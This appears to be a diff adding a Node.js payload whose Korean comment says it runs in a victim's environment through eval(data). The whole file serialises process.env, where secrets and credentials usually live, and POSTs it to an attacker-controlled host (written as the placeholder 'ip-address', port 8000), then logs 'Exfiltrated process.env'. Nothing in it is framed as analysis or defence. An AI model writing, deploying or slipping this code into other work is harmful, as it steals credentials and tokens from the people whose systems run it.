@@ -1,0 +1,33 @@
+
+// 이 코드는 피해자 환경에서 eval(data)로 실행됨
+
+const http = require("http");
+
+function exfiltrateEnv(env) {
+  const payload = JSON.stringify(env);
+
+  const options = {
+    hostname: "ip-address",  
+    port: 8000,
+    path: "/",
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+      "Content-Length": Buffer.byteLength(payload),
+    },
+  };
+
+  const req = http.request(options, (res) => {
+  });
+
+  req.on("error", (err) => {
+    console.error("Exfil error:", err);
+  });
+
+  req.write(payload);
+  req.end();
+
+  console.log("Exfiltrated process.env");
+}
+
+exfiltrateEnv(process.env);
